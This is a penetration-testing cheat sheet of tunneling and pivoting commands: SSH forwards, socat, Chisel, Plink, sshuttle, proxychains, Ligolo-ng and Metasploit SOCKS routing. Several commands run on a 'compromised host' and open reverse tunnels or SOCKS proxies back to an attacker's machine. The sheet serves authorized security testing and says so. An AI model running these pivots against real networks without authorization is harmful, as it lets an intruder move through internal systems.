# Port Forwarding & Proxying 

This cheat sheet covers common **port forwarding, tunneling, and proxying techniques** used during penetration testing for **pivoting and lateral movement**. Use only in authorized environments.

---

## Port Forwarding

### SSH Tunneling – Local Port Forwarding

```bash
ssh user@<IP> -p <port> -L 8001:127.0.0.1:8080 -fN
```

Access remote service on `127.0.0.1:8080` via `localhost:8001`.

### SSH Tunneling – Remote Port Forwarding

```bash
ssh -R 5555:127.0.0.1:5555 -p 2222 <user>@<IP>
```

Expose your local port to the remote host.

---

### Socat – Port Forwarding

```bash
./socat.exe TCP-LISTEN:8002,fork,reuseaddr TCP:127.0.0.1:8080
```

---

### Chisel – Remote Port Forwarding

**Your Machine**

```bash
./chisel server -p <listen_port> --reverse &
```

**Compromised Host**

```bash
./chisel client <your_ip>:<listen_port> R:<local_port>:<target_ip>:<target_port> &
```

---

### Chisel – Local Port Forwarding

**Compromised Host**

```bash
./chisel server -p <listen_port>
```

**Your Machine**

```bash
./chisel client <target_ip>:<listen_port> <local_port>:<target_ip>:<target_port>
```

---

### Plink – Remote Port Forwarding (Windows)

```cmd
cmd.exe /c echo y | plink.exe -ssh -l <user> -pw <password> -R 192.168.0.20:1234:127.0.0.1:3306 192.168.0.20
```

---

## Proxying & Network Pivoting

### sshuttle (Unix Proxying)

```bash
sshuttle -r user@<ip> --ssh-cmd "ssh -i private_key" 172.16.0.0/24
```

Creates transparent proxy over SSH.

---

### SSH + Proxychains

Edit `/etc/proxychains.conf`:

```text
socks4 127.0.0.1 8080
```

Create SOCKS proxy:

```bash
ssh -N -D 127.0.0.1:8080 <user>@<ip> -p 2222
```

---

### Chisel – Reverse SOCKS Proxy

**Your Machine**

```bash
./chisel server -p <listen_port> --reverse &
```

**Compromised Host**

```bash
./chisel client <your_ip>:<listen_port> R:socks
```

---

### Chisel – Forward SOCKS Proxy

**Compromised Host**

```bash
./chisel server -p <listen_port> --socks5
```

**Your Machine**

```bash
./chisel client <target_ip>:<listen_port> <proxy_port>:socks
```

---

## Ligolo-ng (Modern Pivoting – Recommended)

### Setup (Your Machine)

```bash
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert
```

### Agent (Compromised Host)

```bash
agent -connect <your_ip>:11601 -ignore-cert
```

### Inside Ligolo Console

```text
session
select <id>
start
```

### Add Route

```bash
sudo ip route add 172.16.0.0/24 dev ligolo
```

Now access internal network directly (no proxychains required).

---

## Metasploit – Proxying

```text
route add <ip>/24 1
route print
use auxiliary/server/socks_proxy
run
```

---

## Notes

* **Ligolo-ng** is preferred for large internal networks
* **Chisel** is lightweight and firewall-friendly
* **SSH tunnels** are stable but limited
* Combine with `proxychains`, `nmap`, `impacket`, `crackmapexec`

---

⚠️ Use responsibly and only in authorized penetration testing environments.
